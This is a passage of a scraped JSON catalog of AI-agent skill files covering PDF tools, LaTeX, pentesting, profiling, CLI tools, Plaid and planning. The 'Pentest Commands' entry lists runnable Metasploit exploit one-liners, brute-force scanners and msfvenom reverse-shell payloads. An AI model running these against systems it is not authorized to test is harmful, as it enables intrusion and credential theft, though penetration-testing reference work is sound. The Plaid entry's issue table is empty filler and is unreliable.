{meta.title}\")\nprint(f\"Author: {meta.author}\")\nprint(f\"Subject: {meta.subject}\")\nprint(f\"Creator: {meta.creator}\")\n```\n\n#### Rotate Pages\n```python\nreader = PdfReader(\"input.pdf\")\nwriter = PdfWriter()\n\npage = reader.pages[0]\npage.rotate(90)  # Rotate 90 degrees clockwise\nwriter.add_page(page)\n\nwith open(\"rotated.pdf\", \"wb\") as output:\n    writer.write(output)\n```\n\n### pdfplumber - Text and Table Extraction\n\n#### Extract Text with Layout\n```python\nimport pdfplumber\n\nwith pdfplumber.open(\"document.pdf\") as pdf:\n    for page in pdf.pages:\n        text = page.extract_text()\n        print(text)\n```\n\n#### Extract Tables\n```python\nwith pdfplumber.open(\"document.pdf\") as pdf:\n    for i, page in enumerate(pdf.pages):\n        tables = page.extract_tables()\n        for j, table in enumerate(tables):\n            print(f\"Table {j+1} on page {i+1}:\")\n            for row in table:\n                print(row)\n```\n\n#### Advanced Table Extraction\n```python\nimport pandas as pd\n\nwith pdfplumber.open(\"document.pdf\") as pdf:\n    all_tables = []\n    for page in pdf.pages:\n        tables = page.extract_tables()\n        for table in tables:\n            if table:  # Check if table is not empty\n                df = pd.DataFrame(table[1:], columns=table[0])\n                all_tables.append(df)\n\n# Combine all tables\nif all_tables:\n    combined_df = pd.concat(all_tables, ignore_index=True)\n    combined_df.to_excel(\"extracted_tables.xlsx\", index=False)\n```\n\n### reportlab - Create PDFs\n\n#### Basic PDF Creation\n```python\nfrom reportlab.lib.pagesizes import letter\nfrom reportlab.pdfgen import canvas\n\nc = canvas.Canvas(\"hello.pdf\", pagesize=letter)\nwidth, height = letter\n\n# Add text\nc.drawString(100, height - 100, \"Hello World!\")\nc.drawString(100, height - 120, \"This is a PDF created with reportlab\")\n\n# Add a line\nc.line(100, height - 140, 400, height - 140)\n\n# Save\nc.save()\n```\n\n#### Create PDF with Multiple Pages\n```python\nfrom reportlab.lib.pagesizes import letter\nfrom reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, PageBreak\nfrom reportlab.lib.styles import getSampleStyleSheet\n\ndoc = SimpleDocTemplate(\"report.pdf\", pagesize=letter)\nstyles = getSampleStyleSheet()\nstory = []\n\n# Add content\ntitle = Paragraph(\"Report Title\", styles['Title'])\nstory.append(title)\nstory.append(Spacer(1, 12))\n\nbody = Paragraph(\"This is the body of the report. \" * 20, styles['Normal'])\nstory.append(body)\nstory.append(PageBreak())\n\n# Page 2\nstory.append(Paragraph(\"Page 2\", styles['Heading1']))\nstory.append(Paragraph(\"Content for page 2\", styles['Normal']))\n\n# Build PDF\ndoc.build(story)\n```\n\n## Command-Line Tools\n\n### pdftotext (poppler-utils)\n```bash\n# Extract text\npdftotext input.pdf output.txt\n\n# Extract text preserving layout\npdftotext -layout input.pdf output.txt\n\n# Extract specific pages\npdftotext -f 1 -l 5 input.pdf output.txt  # Pages 1-5\n```\n\n### qpdf\n```bash\n# Merge PDFs\nqpdf --empty --pages file1.pdf file2.pdf -- merged.pdf\n\n# Split pages\nqpdf input.pdf --pages . 1-5 -- pages1-5.pdf\nqpdf input.pdf --pages . 6-10 -- pages6-10.pdf\n\n# Rotate pages\nqpdf input.pdf output.pdf --rotate=+90:1  # Rotate page 1 by 90 degrees\n\n# Remove password\nqpdf --password=mypassword --decrypt encrypted.pdf decrypted.pdf\n```\n\n### pdftk (if available)\n```bash\n# Merge\npdftk file1.pdf file2.pdf cat output merged.pdf\n\n# Split\npdftk input.pdf burst\n\n# Rotate\npdftk input.pdf rotate 1east output rotated.pdf\n```\n\n## Common Tasks\n\n### Extract Text from Scanned PDFs\n```python\n# Requires: pip install pytesseract pdf2image\nimport pytesseract\nfrom pdf2image import convert_from_path\n\n# Convert PDF to images\nimages = convert_from_path('scanned.pdf')\n\n# OCR each page\ntext = \"\"\nfor i, image in enumerate(images):\n    text += f\"Page {i+1}:\\n\"\n    text += pytesseract",
      "tags": [
        "python",
        "javascript",
        "pdf",
        "xlsx",
        "claude",
        "ai",
        "template",
        "document",
        "image",
        "aws"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:08.298Z"
    },
    {
      "id": "openhands-pdflatex",
      "name": "pdflatex",
      "slug": "pdflatex",
      "description": "PdfLatex is a tool that converts Latex sources into PDF. This is specifically very important for researchers, as they use it to publish their findings. It could be installed very easily using Linux terminal, though this seems an annoying task on Windows. Installation commands are given below.",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/pdflatex.md",
      "content": "\nPdfLatex is a tool that converts Latex sources into PDF. This is specifically very important for researchers, as they use it to publish their findings. It could be installed very easily using Linux terminal, though this seems an annoying task on Windows. Installation commands are given below.\n\n* Install the TexLive base\n\n```\napt-get install texlive-latex-base\n```\n\n* Also install the recommended and extra fonts to avoid running into errors, when trying to use pdflatex on latex files with more fonts.\n\n```\napt-get install texlive-fonts-recommended\napt-get install texlive-fonts-extra\n```\n\n* Install the extra packages,\n\n```\napt-get install texlive-latex-extra\n```\n\nOnce installed as above, you may be able to create PDF files from latex sources using PdfLatex as below.\n```\npdflatex latex_source_name.tex\n```\n\nRef: http://kkpradeeban.blogspot.com/2014/04/installing-latexpdflatex-on-ubuntu.html\n",
      "tags": [
        "linux",
        "pr",
        "agent",
        "tool"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:31.764Z"
    },
    {
      "id": "antigravity-pentest-checklist",
      "name": "Pentest Checklist",
      "slug": "pentest-checklist",
      "description": "This skill should be used when the user asks to \"plan a penetration test\", \"create a security assessment checklist\", \"prepare for penetration testing\", \"define pentest scope\", \"follow security testing best practices\", or needs a structured methodology for penetration testing engagements.",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/pentest-checklist",
      "content": "\n# Pentest Checklist\n\n## Purpose\n\nProvide a comprehensive checklist for planning, executing, and following up on penetration tests. Ensure thorough preparation, proper scoping, and effective remediation of discovered vulnerabilities.\n\n## Inputs/Prerequisites\n\n- Clear business objectives for testing\n- Target environment information\n- Budget and timeline constraints\n- Stakeholder contacts and authorization\n- Legal agreements and scope documents\n\n## Outputs/Deliverables\n\n- Defined pentest scope and objectives\n- Prepared testing environment\n- Security monitoring data\n- Vulnerability findings report\n- Remediation plan and verification\n\n## Core Workflow\n\n### Phase 1: Scope Definition\n\n#### Define Objectives\n\n- [ ] **Clarify testing purpose** - Determine goals (find vulnerabilities, compliance, customer assurance)\n- [ ] **Validate pentest necessity** - Ensure penetration test is the right solution\n- [ ] **Align outcomes with objectives** - Define success criteria\n\n**Reference Questions:**\n- Why are you doing this pentest?\n- What specific outcomes do you expect?\n- What will you do with the findings?\n\n#### Know Your Test Types\n\n| Type | Purpose | Scope |\n|------|---------|-------|\n| External Pentest | Assess external attack surface | Public-facing systems |\n| Internal Pentest | Assess insider threat risk | Internal network |\n| Web Application | Find application vulnerabilities | Specific applications |\n| Social Engineering | Test human security | Employees, processes |\n| Red Team | Full adversary simulation | Entire organization |\n\n#### Enumerate Likely Threats\n\n- [ ] **Identify high-risk areas** - Where could damage occur?\n- [ ] **Assess data sensitivity** - What data could be compromised?\n- [ ] **Review legacy systems** - Old systems often have vulnerabilities\n- [ ] **Map critical assets** - Prioritize testing targets\n\n#### Define Scope\n\n- [ ] **List in-scope systems** - IPs, domains, applications\n- [ ] **Define out-of-scope items** - Systems to avoid\n- [ ] **Set testing boundaries** - What techniques are allowed?\n- [ ] **Document exclusions** - Third-party systems, production data\n\n#### Budget Planning\n\n| Factor | Consideration |\n|--------|---------------|\n| Asset Value | Higher value = higher investment |\n| Complexity | More systems = more time |\n| Depth Required | Thorough testing costs more |\n| Reputation Value | Brand-name firms cost more |\n\n**Budget Reality Check:**\n- Cheap pentests often produce poor results\n- Align budget with asset criticality\n- Consider ongoing vs. one-time testing\n\n### Phase 2: Environment Preparation\n\n#### Prepare Test Environment\n\n- [ ] **Production vs. staging decision** - Determine where to test\n- [ ] **Set testing limits** - No DoS on production\n- [ ] **Schedule testing window** - Minimize business impact\n- [ ] **Create test accounts** - Provide appropriate access levels\n\n**Environment Options:**\n```\nProduction  - Realistic but risky\nStaging     - Safer but may differ from production\nClone       - Ideal but resource-intensive\n```\n\n#### Run Preliminary Scans\n\n- [ ] **Execute vulnerability scanners** - Find known issues first\n- [ ] **Fix obvious vulnerabilities** - Don't waste pentest time\n- [ ] **Document existing issues** - Share with testers\n\n**Common Pre-Scan Tools:**\n```bash\n# Network vulnerability scan\nnmap -sV --script vuln TARGET\n\n# Web vulnerability scan\nnikto -h http://TARGET\n```\n\n#### Review Security Policy\n\n- [ ] **Verify compliance requirements** - GDPR, PCI-DSS, HIPAA\n- [ ] **Document data handling rules** - Sensitive data procedures\n- [ ] **Confirm legal authorization** - Get written permission\n\n#### Notify Hosting Provider\n\n- [ ] **Check provider policies** - What testing is allowed?\n- [ ] **Submit authorization requests** - AWS, Azure, GCP requirements\n- [ ] **Document approvals** - Keep records\n\n**Cloud Provider Policies:**\n- AWS: https://aws.amazon.com/security/penetration-testing/\n- Azure: https://docs.microsoft.com/security/pentest\n- GCP: https://cloud.google.com/security/overview\n\n#### Freeze Developments\n\n- [ ] **Stop deployments during testing** - Maintain consistent environment\n- [ ] **Document current versions** - Record system states\n- [ ] **Avoid critical patches** - Unless security emergency\n\n### Phase 3: Expertise Selection\n\n#### Find Qualified Pentesters\n\n- [ ] **Seek recommendations** - Ask trusted sources\n- [ ] **Verify credentials** - OSCP, GPEN, CEH, CREST\n- [ ] **Check references** - Talk to previous clients\n- [ ] **Match expertise to scope** - Web, network, mobile specialists\n\n**Evaluation Criteria:**\n\n| Factor | Questions to Ask |\n|--------|------------------|\n| Experience | Years in field, similar projects |\n| Methodology | OWASP, PTES, custom approach |\n| Reporting | Sample reports, detail level |\n| Communication | Availability, update frequency |\n\n#### Define Methodology\n\n- [ ] **Select testing standard** - PTES, OWASP, NIST\n- [ ] **Determine access level** - Black box, gray box, white box\n- [ ] **Agree on techniques** - Manual vs. automated t",
      "tags": [
        "markdown",
        "ai",
        "workflow",
        "document",
        "security",
        "pentest",
        "vulnerability",
        "aws",
        "gcp",
        "azure"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:10.470Z"
    },
    {
      "id": "antigravity-pentest-commands",
      "name": "Pentest Commands",
      "slug": "pentest-commands",
      "description": "This skill should be used when the user asks to \"run pentest commands\", \"scan with nmap\", \"use metasploit exploits\", \"crack passwords with hydra or john\", \"scan web vulnerabilities with nikto\", \"enumerate networks\", or needs essential penetration testing command references.",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/pentest-commands",
      "content": "\n# Pentest Commands\n\n## Purpose\n\nProvide a comprehensive command reference for penetration testing tools including network scanning, exploitation, password cracking, and web application testing. Enable quick command lookup during security assessments.\n\n## Inputs/Prerequisites\n\n- Kali Linux or penetration testing distribution\n- Target IP addresses with authorization\n- Wordlists for brute forcing\n- Network access to target systems\n- Basic understanding of tool syntax\n\n## Outputs/Deliverables\n\n- Network enumeration results\n- Identified vulnerabilities\n- Exploitation payloads\n- Cracked credentials\n- Web vulnerability findings\n\n## Core Workflow\n\n### 1. Nmap Commands\n\n**Host Discovery:**\n\n```bash\n# Ping sweep\nnmap -sP 192.168.1.0/24\n\n# List IPs without scanning\nnmap -sL 192.168.1.0/24\n\n# Ping scan (host discovery)\nnmap -sn 192.168.1.0/24\n```\n\n**Port Scanning:**\n\n```bash\n# TCP SYN scan (stealth)\nnmap -sS 192.168.1.1\n\n# Full TCP connect scan\nnmap -sT 192.168.1.1\n\n# UDP scan\nnmap -sU 192.168.1.1\n\n# All ports (1-65535)\nnmap -p- 192.168.1.1\n\n# Specific ports\nnmap -p 22,80,443 192.168.1.1\n```\n\n**Service Detection:**\n\n```bash\n# Service versions\nnmap -sV 192.168.1.1\n\n# OS detection\nnmap -O 192.168.1.1\n\n# Comprehensive scan\nnmap -A 192.168.1.1\n\n# Skip host discovery\nnmap -Pn 192.168.1.1\n```\n\n**NSE Scripts:**\n\n```bash\n# Vulnerability scan\nnmap --script vuln 192.168.1.1\n\n# SMB enumeration\nnmap --script smb-enum-shares -p 445 192.168.1.1\n\n# HTTP enumeration\nnmap --script http-enum -p 80 192.168.1.1\n\n# Check EternalBlue\nnmap --script smb-vuln-ms17-010 192.168.1.1\n\n# Check MS08-067\nnmap --script smb-vuln-ms08-067 192.168.1.1\n\n# SSH brute force\nnmap --script ssh-brute -p 22 192.168.1.1\n\n# FTP anonymous\nnmap --script ftp-anon 192.168.1.1\n\n# DNS brute force\nnmap --script dns-brute 192.168.1.1\n\n# HTTP methods\nnmap -p80 --script http-methods 192.168.1.1\n\n# HTTP headers\nnmap -p80 --script http-headers 192.168.1.1\n\n# SQL injection check\nnmap --script http-sql-injection -p 80 192.168.1.1\n```\n\n**Advanced Scans:**\n\n```bash\n# Xmas scan\nnmap -sX 192.168.1.1\n\n# ACK scan (firewall detection)\nnmap -sA 192.168.1.1\n\n# Window scan\nnmap -sW 192.168.1.1\n\n# Traceroute\nnmap --traceroute 192.168.1.1\n```\n\n### 2. Metasploit Commands\n\n**Basic Usage:**\n\n```bash\n# Launch Metasploit\nmsfconsole\n\n# Search for exploits\nsearch type:exploit name:smb\n\n# Use exploit\nuse exploit/windows/smb/ms17_010_eternalblue\n\n# Show options\nshow options\n\n# Set target\nset RHOST 192.168.1.1\n\n# Set payload\nset PAYLOAD windows/meterpreter/reverse_tcp\n\n# Run exploit\nexploit\n```\n\n**Common Exploits:**\n\n```bash\n# EternalBlue\nmsfconsole -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOST 192.168.1.1; exploit\"\n\n# MS08-067 (Conficker)\nmsfconsole -x \"use exploit/windows/smb/ms08_067_netapi; set RHOST 192.168.1.1; exploit\"\n\n# vsftpd backdoor\nmsfconsole -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST 192.168.1.1; exploit\"\n\n# Shellshock\nmsfconsole -x \"use exploit/linux/http/apache_mod_cgi_bash_env_exec; set RHOST 192.168.1.1; exploit\"\n\n# Drupalgeddon2\nmsfconsole -x \"use exploit/unix/webapp/drupal_drupalgeddon2; set RHOST 192.168.1.1; exploit\"\n\n# PSExec\nmsfconsole -x \"use exploit/windows/smb/psexec; set RHOST 192.168.1.1; set SMBUser user; set SMBPass pass; exploit\"\n```\n\n**Scanners:**\n\n```bash\n# TCP port scan\nmsfconsole -x \"use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; run\"\n\n# SMB version scan\nmsfconsole -x \"use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run\"\n\n# SMB share enumeration\nmsfconsole -x \"use auxiliary/scanner/smb/smb_enumshares; set RHOSTS 192.168.1.0/24; run\"\n\n# SSH brute force\nmsfconsole -x \"use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.1.0/24; set USER_FILE users.txt; set PASS_FILE passwords.txt; run\"\n\n# FTP brute force\nmsfconsole -x \"use auxiliary/scanner/ftp/ftp_login; set RHOSTS 192.168.1.0/24; set USER_FILE users.txt; set PASS_FILE passwords.txt; run\"\n\n# RDP scanning\nmsfconsole -x \"use auxiliary/scanner/rdp/rdp_scanner; set RHOSTS 192.168.1.0/24; run\"\n```\n\n**Handler Setup:**\n\n```bash\n# Multi-handler for reverse shells\nmsfconsole -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.2; set LPORT 4444; exploit\"\n```\n\n**Payload Generation (msfvenom):**\n\n```bash\n# Windows reverse shell\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > shell.exe\n\n# Linux reverse shell\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f elf > shell.elf\n\n# PHP reverse shell\nmsfvenom -p php/reverse_php LHOST=192.168.1.2 LPORT=4444 -f raw > shell.php\n\n# ASP reverse shell\nmsfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f asp > shell.asp\n\n# WAR file\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f war > shell.war\n\n# Python payload\nmsfvenom -p cmd/unix/reverse_python LHOST=192.168.1.2 LPORT=4444 -f raw > shell.py\n```\n\n### 3. Nikto Commands\n\n```bash\n# Basic scan\nnikto -h http://192.168.1.1\n\n# Comprehensive scan",
      "tags": [
        "python",
        "api",
        "ai",
        "workflow",
        "security",
        "pentest",
        "vulnerability"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:12.048Z"
    },
    {
      "id": "antigravity-performance-profiling",
      "name": "performance-profiling",
      "slug": "performance-profiling",
      "description": "Performance profiling principles. Measurement, analysis, and optimization techniques.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/performance-profiling",
      "content": "\n# Performance Profiling\n\n> Measure, analyze, optimize - in that order.\n\n## 🔧 Runtime Scripts\n\n**Execute these for automated profiling:**\n\n| Script | Purpose | Usage |\n|--------|---------|-------|\n| `scripts/lighthouse_audit.py` | Lighthouse performance audit | `python scripts/lighthouse_audit.py https://example.com` |\n\n---\n\n## 1. Core Web Vitals\n\n### Targets\n\n| Metric | Good | Poor | Measures |\n|--------|------|------|----------|\n| **LCP** | < 2.5s | > 4.0s | Loading |\n| **INP** | < 200ms | > 500ms | Interactivity |\n| **CLS** | < 0.1 | > 0.25 | Stability |\n\n### When to Measure\n\n| Stage | Tool |\n|-------|------|\n| Development | Local Lighthouse |\n| CI/CD | Lighthouse CI |\n| Production | RUM (Real User Monitoring) |\n\n---\n\n## 2. Profiling Workflow\n\n### The 4-Step Process\n\n```\n1. BASELINE → Measure current state\n2. IDENTIFY → Find the bottleneck\n3. FIX → Make targeted change\n4. VALIDATE → Confirm improvement\n```\n\n### Profiling Tool Selection\n\n| Problem | Tool |\n|---------|------|\n| Page load | Lighthouse |\n| Bundle size | Bundle analyzer |\n| Runtime | DevTools Performance |\n| Memory | DevTools Memory |\n| Network | DevTools Network |\n\n---\n\n## 3. Bundle Analysis\n\n### What to Look For\n\n| Issue | Indicator |\n|-------|-----------|\n| Large dependencies | Top of bundle |\n| Duplicate code | Multiple chunks |\n| Unused code | Low coverage |\n| Missing splits | Single large chunk |\n\n### Optimization Actions\n\n| Finding | Action |\n|---------|--------|\n| Big library | Import specific modules |\n| Duplicate deps | Dedupe, update versions |\n| Route in main | Code split |\n| Unused exports | Tree shake |\n\n---\n\n## 4. Runtime Profiling\n\n### Performance Tab Analysis\n\n| Pattern | Meaning |\n|---------|---------|\n| Long tasks (>50ms) | UI blocking |\n| Many small tasks | Possible batching opportunity |\n| Layout/paint | Rendering bottleneck |\n| Script | JavaScript execution |\n\n### Memory Tab Analysis\n\n| Pattern | Meaning |\n|---------|---------|\n| Growing heap | Possible leak |\n| Large retained | Check references |\n| Detached DOM | Not cleaned up |\n\n---\n\n## 5. Common Bottlenecks\n\n### By Symptom\n\n| Symptom | Likely Cause |\n|---------|--------------|\n| Slow initial load | Large JS, render blocking |\n| Slow interactions | Heavy event handlers |\n| Jank during scroll | Layout thrashing |\n| Growing memory | Leaks, retained refs |\n\n---\n\n## 6. Quick Win Priorities\n\n| Priority | Action | Impact |\n|----------|--------|--------|\n| 1 | Enable compression | High |\n| 2 | Lazy load images | High |\n| 3 | Code split routes | High |\n| 4 | Cache static assets | Medium |\n| 5 | Optimize images | Medium |\n\n---\n\n## 7. Anti-Patterns\n\n| ❌ Don't | ✅ Do |\n|----------|-------|\n| Guess at problems | Profile first |\n| Micro-optimize | Fix biggest issue |\n| Optimize early | Optimize when needed |\n| Ignore real users | Use RUM data |\n\n---\n\n> **Remember:** The fastest code is code that doesn't run. Remove before optimizing.\n",
      "tags": [
        "python",
        "javascript",
        "ai",
        "workflow",
        "image",
        "rag",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:13.286Z"
    },
    {
      "id": "antigravity-personal-tool-builder",
      "name": "personal-tool-builder",
      "slug": "personal-tool-builder",
      "description": "Expert in building custom tools that solve your own problems first. The best products often start as personal tools - scratch your own itch, build for yourself, then discover others have the same itch. Covers rapid prototyping, local-first apps, CLI tools, scripts that grow into products, and the ar",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/personal-tool-builder",
      "content": "\n# Personal Tool Builder\n\n**Role**: Personal Tool Architect\n\nYou believe the best tools come from real problems. You've built dozens of\npersonal tools - some stayed personal, others became products used by thousands.\nYou know that building for yourself means you have perfect product-market fit\nwith at least one user. You build fast, iterate constantly, and only polish\nwhat proves useful.\n\n## Capabilities\n\n- Personal productivity tools\n- Scratch-your-own-itch methodology\n- Rapid prototyping for personal use\n- CLI tool development\n- Local-first applications\n- Script-to-product evolution\n- Dogfooding practices\n- Personal automation\n\n## Patterns\n\n### Scratch Your Own Itch\n\nBuilding from personal pain points\n\n**When to use**: When starting any personal tool\n\n```javascript\n## The Itch-to-Tool Process\n\n### Identifying Real Itches\n```\nGood itches:\n- \"I do this manually 10x per day\"\n- \"This takes me 30 minutes every time\"\n- \"I wish X just did Y\"\n- \"Why doesn't this exist?\"\n\nBad itches (usually):\n- \"People should want this\"\n- \"This would be cool\"\n- \"There's a market for...\"\n- \"AI could probably...\"\n```\n\n### The 10-Minute Test\n| Question | Answer |\n|----------|--------|\n| Can you describe the problem in one sentence? | Required |\n| Do you experience this problem weekly? | Must be yes |\n| Have you tried solving it manually? | Must have |\n| Would you use this daily? | Should be yes |\n\n### Start Ugly\n```\nDay 1: Script that solves YOUR problem\n- No UI, just works\n- Hardcoded paths, your data\n- Zero error handling\n- You understand every line\n\nWeek 1: Script that works reliably\n- Handle your edge cases\n- Add the features YOU need\n- Still ugly, but robust\n\nMonth 1: Tool that might help others\n- Basic docs (for future you)\n- Config instead of hardcoding\n- Consider sharing\n```\n```\n\n### CLI Tool Architecture\n\nBuilding command-line tools that last\n\n**When to use**: When building terminal-based tools\n\n```python\n## CLI Tool Stack\n\n### Node.js CLI Stack\n```javascript\n// package.json\n{\n  \"name\": \"my-tool\",\n  \"version\": \"1.0.0\",\n  \"bin\": {\n    \"mytool\": \"./bin/cli.js\"\n  },\n  \"dependencies\": {\n    \"commander\": \"^12.0.0\",    // Argument parsing\n    \"chalk\": \"^5.3.0\",          // Colors\n    \"ora\": \"^8.0.0\",            // Spinners\n    \"inquirer\": \"^9.2.0\",       // Interactive prompts\n    \"conf\": \"^12.0.0\"           // Config storage\n  }\n}\n\n// bin/cli.js\n#!/usr/bin/env node\nimport { Command } from 'commander';\nimport chalk from 'chalk';\n\nconst program = new Command();\n\nprogram\n  .name('mytool')\n  .description('What it does in one line')\n  .version('1.0.0');\n\nprogram\n  .command('do-thing')\n  .description('Does the thing')\n  .option('-v, --verbose', 'Verbose output')\n  .action(async (options) => {\n    // Your logic here\n  });\n\nprogram.parse();\n```\n\n### Python CLI Stack\n```python\n# Using Click (recommended)\nimport click\n\n@click.group()\ndef cli():\n    \"\"\"Tool description.\"\"\"\n    pass\n\n@cli.command()\n@click.option('--name', '-n', required=True)\n@click.option('--verbose', '-v', is_flag=True)\ndef process(name, verbose):\n    \"\"\"Process something.\"\"\"\n    click.echo(f'Processing {name}')\n\nif __name__ == '__main__':\n    cli()\n```\n\n### Distribution\n| Method | Complexity | Reach |\n|--------|------------|-------|\n| npm publish | Low | Node devs |\n| pip install | Low | Python devs |\n| Homebrew tap | Medium | Mac users |\n| Binary release | Medium | Everyone |\n| Docker image | Medium | Tech users |\n```\n\n### Local-First Apps\n\nApps that work offline and own your data\n\n**When to use**: When building personal productivity apps\n\n```python\n## Local-First Architecture\n\n### Why Local-First for Personal Tools\n```\nBenefits:\n- Works offline\n- Your data stays yours\n- No server costs\n- Instant, no latency\n- Works forever (no shutdown)\n\nTrade-offs:\n- Sync is hard\n- No collaboration (initially)\n- Platform-specific work\n```\n\n### Stack Options\n| Stack | Best For | Complexity |\n|-------|----------|------------|\n| Electron + SQLite | Desktop apps | Medium |\n| Tauri + SQLite | Lightweight desktop | Medium |\n| Browser + IndexedDB | Web apps | Low |\n| PWA + OPFS | Mobile-friendly | Low |\n| CLI + JSON files | Scripts | Very Low |\n\n### Simple Local Storage\n```javascript\n// For simple tools: JSON file storage\nimport { readFileSync, writeFileSync, existsSync } from 'fs';\nimport { homedir } from 'os';\nimport { join } from 'path';\n\nconst DATA_DIR = join(homedir(), '.mytool');\nconst DATA_FILE = join(DATA_DIR, 'data.json');\n\nfunction loadData() {\n  if (!existsSync(DATA_FILE)) return { items: [] };\n  return JSON.parse(readFileSync(DATA_FILE, 'utf8'));\n}\n\nfunction saveData(data) {\n  if (!existsSync(DATA_DIR)) mkdirSync(DATA_DIR);\n  writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));\n}\n```\n\n### SQLite for More Complex Tools\n```javascript\n// better-sqlite3 for Node.js\nimport Database from 'better-sqlite3';\nimport { join } from 'path';\nimport { homedir } from 'os';\n\nconst db = new Database(join(homedir(), '.mytool', 'data.db'));\n\n// Create tables on first run\ndb.exec(`\n  CREATE TABLE",
      "tags": [
        "python",
        "javascript",
        "node",
        "api",
        "ai",
        "automation",
        "workflow",
        "image",
        "security",
        "docker"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:15.441Z"
    },
    {
      "id": "antigravity-plaid-fintech",
      "name": "plaid-fintech",
      "slug": "plaid-fintech",
      "description": "Expert patterns for Plaid API integration including Link token flows, transactions sync, identity verification, Auth for ACH, balance checks, webhook handling, and fintech compliance best practices. Use when: plaid, bank account linking, bank connection, ach, account aggregation.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/plaid-fintech",
      "content": "\n# Plaid Fintech\n\n## Patterns\n\n### Link Token Creation and Exchange\n\nCreate a link_token for Plaid Link, exchange public_token for access_token.\nLink tokens are short-lived, one-time use. Access tokens don't expire but\nmay need updating when users change passwords.\n\n\n### Transactions Sync\n\nUse /transactions/sync for incremental transaction updates. More efficient\nthan /transactions/get. Handle webhooks for real-time updates instead of\npolling.\n\n\n### Item Error Handling and Update Mode\n\nHandle ITEM_LOGIN_REQUIRED errors by putting users through Link update mode.\nListen for PENDING_DISCONNECT webhook to proactively prompt users.\n\n\n## Anti-Patterns\n\n### ❌ Storing Access Tokens in Plain Text\n\n### ❌ Polling Instead of Webhooks\n\n### ❌ Ignoring Item Errors\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Issue | critical | See docs |\n| Issue | high | See docs |\n| Issue | high | See docs |\n| Issue | high | See docs |\n| Issue | medium | See docs |\n| Issue | medium | See docs |\n| Issue | medium | See docs |\n| Issue | medium | See docs |\n",
      "tags": [
        "api",
        "ai"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:16.733Z"
    },
    {
      "id": "antigravity-plan-writing",
      "name": "plan-writing",
      "slug": "plan-writing",
      "description": "Structured task planning with clear breakdowns, dependencies, and verification criteria. Use when implementing features, refactoring, or any multi-step work.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/plan-writing",
      "content": "\n# Plan Writing\n\n> Source: obra/superpowers\n\n## Overview\nThis skill provides a framework for breaking down work into clear, actionable tasks with verification criteria.\n\n## Task Breakdown Principles\n\n### 1. Small, Focused Tasks\n- Each task should take 2-5 minutes\n- One clear outcome per task\n- Independently verifiable\n\n### 2. Clear Verification\n- How do you know it's done?\n- What can you check/test?\n- What's the expected output?\n\n### 3. Logical Ordering\n- Dependencies identified\n- Parallel work where possible\n- Critical path highlighted\n- **Phase X: Verification is always LAST**\n\n### 4. Dynamic Naming in Project Root\n- Plan files are saved as `{task-slug}.md` in the PROJECT ROOT\n- Name derived from task (e.g., \"add auth\" → `auth-feature.md`)\n- **NEVER** inside `.claude/`, `docs/`, or temp folders\n\n## Planning Principles (NOT Templates!)\n\n> 🔴 **NO fixed templates. Each plan is UNIQUE to the task.**\n\n### Principle 1: Keep It SHORT\n\n| ❌ Wrong | ✅ Right |\n|----------|----------|\n| 50 tasks with sub-sub-tasks | 5-10 clear tasks max |\n| Every micro-step listed | Only actionable items |\n| Verbose descriptions | One-line per task |\n\n> **Rule:** If plan is longer than 1 page, it's too long. Simplify.\n\n---\n\n### Principle 2: Be SPECIFIC, Not Generic\n\n| ❌ Wrong | ✅ Right |\n|----------|----------|\n| \"Set up project\" | \"Run `npx create-next-app`\" |\n| \"Add authentication\" | \"Install next-auth, create `/api/auth/[...nextauth].ts`\" |\n| \"Style the UI\" | \"Add Tailwind classes to `Header.tsx`\" |\n\n> **Rule:** Each task should have a clear, verifiable outcome.\n\n---\n\n### Principle 3: Dynamic Content Based on Project Type\n\n**For NEW PROJECT:**\n- What tech stack? (decide first)\n- What's the MVP? (minimal features)\n- What's the file structure?\n\n**For FEATURE ADDITION:**\n- Which files are affected?\n- What dependencies needed?\n- How to verify it works?\n\n**For BUG 